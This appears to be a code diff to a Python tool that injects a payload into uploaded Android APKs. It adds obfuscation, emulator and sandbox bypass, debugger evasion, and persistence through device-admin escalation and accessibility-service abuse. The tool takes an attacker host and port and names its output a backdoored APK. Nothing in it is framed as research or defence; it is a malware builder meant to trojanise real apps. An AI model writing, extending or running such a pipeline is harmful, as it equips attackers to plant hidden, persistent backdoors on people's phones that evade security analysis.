@@ -22,6 +22,11 @@ from apk_analysis_engine import APKAnalysisEngine
 from payload_injection_system import MultiVectorInjector
 from stealth_mechanisms import StealthMechanismEngine
 
+# Import Phase 3 advanced engines
+from advanced_obfuscation import AdvancedObfuscationEngine, ObfuscationConfig
+from anti_detection_measures import AntiDetectionEngine, AntiDetectionConfig  
+from persistence_mechanisms import PersistenceEngine, PersistenceConfig
+
 WORKSPACE = Path("/workspace")
 TASKS_ROOT = WORKSPACE / "tasks"
 UPLOADS_ROOT = WORKSPACE / "uploads"
@@ -429,13 +434,44 @@ class AdvancedAPKProcessor:
             print(f"Signing error: {e}")
 
 def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
-    """Process uploaded APK with advanced modifications"""
+    """Process uploaded APK with Phase 3 ultimate advanced modifications"""
     t = tasks[task_id]
     
-    # Initialize advanced engines
+    # Initialize Phase 2 engines
     analysis_engine = APKAnalysisEngine(base)
     injector = MultiVectorInjector(base)
     stealth_engine = StealthMechanismEngine(base)
+    
+    # Initialize Phase 3 ultimate engines
+    obfuscation_config = ObfuscationConfig(
+        string_encryption_level=5,
+        control_flow_complexity=10,
+        dead_code_ratio=0.5,
+        api_redirection_level=3,
+        dynamic_key_rotation=True,
+        anti_analysis_hooks=True
+    )
+    obfuscation_engine = AdvancedObfuscationEngine(obfuscation_config)
+    
+    anti_detection_config = AntiDetectionConfig(
+        emulator_bypass_level=5,
+        sandbox_escape_level=5,
+        debugger_evasion_level=5,
+        network_masking_level=3,
+        enable_vm_detection=True,
+        enable_analysis_detection=True
+    )
+    anti_detection_engine = AntiDetectionEngine(anti_detection_config)
+    
+    persistence_config = PersistenceConfig(
+        device_admin_level=5,
+        accessibility_abuse_level=5,
+        system_app_level=3,
+        rootless_level=5,
+        enable_stealth_mode=True,
+        enable_auto_restart=True
+    )
+    persistence_engine = PersistenceEngine(persistence_config)
     
     try:
         with locks[task_id]:
@@ -451,6 +487,7 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         (workspace / "temp").mkdir(exist_ok=True)
         (workspace / "logs").mkdir(exist_ok=True)
         (workspace / "analysis").mkdir(exist_ok=True)
+        (workspace / "phase3").mkdir(exist_ok=True)
         
         build_log = workspace / "logs" / "build.log"
         
@@ -468,10 +505,11 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         
         # Log start
         with build_log.open("w") as log:
-            log.write(f"Starting advanced APK modification: {datetime.now()}\n")
+            log.write(f"Starting Phase 3 Ultimate APK modification: {datetime.now()}\n")
             log.write(f"Original file: {original_apk}\n")
             log.write(f"File info: {file_info}\n")
-            log.write(f"Target: {params.get('lhost')}:{params.get('lport')}\n\n")
+            log.write(f"Target: {params.get('lhost')}:{params.get('lport')}\n")
+            log.write(f"Phase 3 Features: Advanced Obfuscation + Anti-Detection + Persistence\n\n")
         
         # Step 1: Comprehensive APK Analysis
         with build_log.open("a") as log:
@@ -562,23 +600,81 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             log.write(f"Techniques: {', '.join(stealth_techniques)}\n")
         
         # Apply stealth mechanisms
-        output_name = params.get("output_name", "advanced_backdoored.apk")
-        final_apk = workspace / "output" / output_name
-        
-        stealth_success = stealth_engine.apply_stealth_techniques(temp_apk, final_apk, stealth_config)
+        stealth_apk = workspace / "temp" / "stealth.apk"
+        stealth_success = stealth_engine.apply_stealth_techniques(temp_apk, stealth_apk, stealth_config)
         
         if not stealth_success:
-            # Fallback: copy injected APK if stealth fails
+            # Fallback: use injected APK if stealth fails
             with build_log.open("a") as log:
-                log.write("Stealth mechanisms failed, using injected APK\n")
-            shutil.copy2(temp_apk, final_apk)
+                log.write("Basic stealth mechanisms failed, proceeding with Phase 3\n")
+            stealth_apk = temp_apk
         else:
             with build_log.open("a") as log:
-                log.write("Stealth mechanisms applied successfully\n")
+                log.write("Basic stealth mechanisms applied successfully\n")
         
-        # Step 6: Final validation and reporting
+        # Phase 3 Steps (NEW)
+        # Step 6: Apply Advanced Obfuscation
         with build_log.open("a") as log:
-            log.write("Step 6: Final validation...\n")
+            log.write("Step 6: Applying Phase 3 Advanced Obfuscation...\n")
+            log.write("  - Dynamic String Encryption with Key Rotation\n")
+            log.write("  - Control Flow Flattening (Complexity Level 10)\n")
+            log.write("  - Advanced Dead Code Injection (50% ratio)\n")
+            log.write("  - API Call Redirection\n")
+        
+        obfuscated_apk = workspace / "phase3" / "obfuscated.apk"
+        obfuscation_success = obfuscation_engine.apply_full_obfuscation(stealth_apk, obfuscated_apk)
+        
+        if not obfuscation_success:
+            with build_log.open("a") as log:
+                log.write("Advanced obfuscation failed, using previous version\n")
+            obfuscated_apk = stealth_apk
+        else:
+            with build_log.open("a") as log:
+                log.write("Advanced obfuscation applied successfully\n")
+        
+        # Step 7: Apply Anti-Detection Measures
+        with build_log.open("a") as log:
+            log.write("Step 7: Applying Phase 3 Anti-Detection Measures...\n")
+            log.write("  - Emulator Detection Bypass (Level 5)\n")
+            log.write("  - Sandbox Escape Techniques (Level 5)\n")
+            log.write("  - Advanced Debugger Evasion (Level 5)\n")
+            log.write("  - Network Traffic Masking (Level 3)\n")
+        
+        anti_detection_apk = workspace / "phase3" / "anti_detection.apk"
+        anti_detection_success = anti_detection_engine.apply_anti_detection(obfuscated_apk, anti_detection_apk)
+        
+        if not anti_detection_success:
+            with build_log.open("a") as log:
+                log.write("Anti-detection measures failed, using previous version\n")
+            anti_detection_apk = obfuscated_apk
+        else:
+            with build_log.open("a") as log:
+                log.write("Anti-detection measures applied successfully\n")
+        
+        # Step 8: Apply Persistence Mechanisms
+        with build_log.open("a") as log:
+            log.write("Step 8: Applying Phase 3 Persistence Mechanisms...\n")
+            log.write("  - Device Admin Privilege Escalation (Level 5)\n")
+            log.write("  - Accessibility Service Abuse (Level 5)\n")
+            log.write("  - System App Installation (Level 3)\n")
+            log.write("  - Root-less Persistence (Level 5)\n")
+        
+        output_name = params.get("output_name", "phase3_ultimate_backdoored.apk")
+        final_apk = workspace / "output" / output_name
+        
+        persistence_success = persistence_engine.apply_persistence_mechanisms(anti_detection_apk, final_apk)
+        
+        if not persistence_success:
+            with build_log.open("a") as log:
+                log.write("Persistence mechanisms failed, using previous version\n")
+            shutil.copy2(anti_detection_apk, final_apk)
+        else:
+            with build_log.open("a") as log:
+                log.write("Persistence mechanisms applied successfully\n")
+        
+        # Step 9: Final validation and comprehensive reporting
+        with build_log.open("a") as log:
+            log.write("Step 9: Final validation and Phase 3 reporting...\n")
         
         if not final_apk.exists():
             raise Exception("Final APK not generated")
@@ -592,8 +688,9 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             log.write(f"Final size: {final_size:,} bytes\n")
             log.write(f"Size change: {size_change:+.1f}%\n")
         
-        # Create comprehensive report
+        # Create comprehensive Phase 3 report
         report = {
+            "phase": "Phase 3 - Ultimate Advanced Modification",
             "original_file": str(original_apk),
             "final_file": str(final_apk),
             "analysis_result": analysis_result,
@@ -611,13 +708,60 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
                 "evasion_techniques": injection_strategy.evasion_techniques
             },
             "stealth_config": stealth_config,
+            "phase3_features": {
+                "advanced_obfuscation": {
+                    "applied": obfuscation_success,
+                    "string_encryption_level": obfuscation_config.string_encryption_level,
+                    "control_flow_complexity": obfuscation_config.control_flow_complexity,
+                    "dead_code_ratio": obfuscation_config.dead_code_ratio,
+                    "api_redirection_level": obfuscation_config.api_redirection_level,
+                    "dynamic_key_rotation": obfuscation_config.dynamic_key_rotation
+                },
+                "anti_detection_measures": {
+                    "applied": anti_detection_success,
+                    "emulator_bypass_level": anti_detection_config.emulator_bypass_level,
+                    "sandbox_escape_level": anti_detection_config.sandbox_escape_level,
+                    "debugger_evasion_level": anti_detection_config.debugger_evasion_level,
+                    "network_masking_level": anti_detection_config.network_masking_level,
+                    "vm_detection_enabled": anti_detection_config.enable_vm_detection,
+                    "analysis_detection_enabled": anti_detection_config.enable_analysis_detection
+                },
+                "persistence_mechanisms": {
+                    "applied": persistence_success,
+                    "device_admin_level": persistence_config.device_admin_level,
+                    "accessibility_abuse_level": persistence_config.accessibility_abuse_level,
+                    "system_app_level": persistence_config.system_app_level,
+                    "rootless_level": persistence_config.rootless_level,
+                    "stealth_mode_enabled": persistence_config.enable_stealth_mode,
+                    "auto_restart_enabled": persistence_config.enable_auto_restart
+                }
+            },
             "modification_summary": {
                 "original_size": original_size,
                 "final_size": final_size,
                 "size_change_percent": size_change,
-                "injection_success": injection_success,
-                "stealth_success": stealth_success
+                "phase2_injection_success": injection_success,
+                "phase2_stealth_success": stealth_success,
+                "phase3_obfuscation_success": obfuscation_success,
+                "phase3_anti_detection_success": anti_detection_success,
+                "phase3_persistence_success": persistence_success
             },
+            "capabilities": [
+                "Multi-vector payload injection",
+                "Runtime stealth mechanisms", 
+                "Dynamic string encryption",
+                "Control flow flattening",
+                "Advanced dead code injection",
+                "API call redirection",
+                "Emulator detection bypass",
+                "Sandbox escape techniques",
+                "Advanced debugger evasion",
+                "Network traffic masking",
+                "Device admin privilege escalation",
+                "Accessibility service abuse",
+                "System app installation",
+                "Root-less persistence"
+            ],
             "timestamps": {
                 "start_time": datetime.now().isoformat(),
                 "analysis_time": analysis_result.get("analysis_timestamp"),
@@ -625,8 +769,8 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             }
         }
         
-        # Save comprehensive report
-        report_file = workspace / "output" / "modification_report.json"
+        # Save comprehensive Phase 3 report
+        report_file = workspace / "output" / "phase3_ultimate_modification_report.json"
         with report_file.open("w") as f:
             json.dump(report, f, indent=2)
         
@@ -634,24 +778,34 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         _finalize_task(t, base, True)
         
         with build_log.open("a") as log:
-            log.write(f"Advanced APK modification completed successfully: {datetime.now()}\n")
+            log.write(f"Phase 3 Ultimate APK modification completed successfully: {datetime.now()}\n")
             log.write(f"Final APK: {final_apk}\n")
-            log.write(f"Report: {report_file}\n")
+            log.write(f"Comprehensive Report: {report_file}\n")
+            log.write("🎯 Phase 3 Features Applied:\n")
+            log.write("   ✅ Advanced Obfuscation Engine\n")
+            log.write("   ✅ Anti-Detection Measures\n")
+            log.write("   ✅ Persistence Mechanisms\n")
+            log.write("🥷 Ultimate Stealth & Evasion Capabilities Achieved!\n")
         
         # Log to database if available
         try:
             from database import db_manager, AuditTracker
             
-            # Track the modification
+            # Track the Phase 3 modification
             AuditTracker.track_file_modification(
                 file_info.get("file_id", "unknown"),
                 task_id,
-                "advanced_apk_modification",
+                "phase3_ultimate_modification",
                 {
-                    "stealth_level": stealth_level,
+                    "phase": "Phase 3",
+                    "obfuscation_level": obfuscation_config.string_encryption_level,
+                    "anti_detection_level": anti_detection_config.emulator_bypass_level,
+                    "persistence_level": persistence_config.device_admin_level,
                     "injection_points": len(injection_strategy.injection_points),
                     "success_probability": injection_strategy.success_probability,
-                    "final_size": final_size
+                    "final_size": final_size,
+                    "all_features_applied": all([injection_success, obfuscation_success, 
+                                               anti_detection_success, persistence_success])
                 }
             )
             
@@ -662,7 +816,7 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             pass  # Database not available
         
     except Exception as e:
-        error_msg = f"Advanced APK modification failed: {str(e)}"
+        error_msg = f"Phase 3 Ultimate APK modification failed: {str(e)}"
         
         with build_log.open("a") as log:
             log.write(f"ERROR: {error_msg}\n")
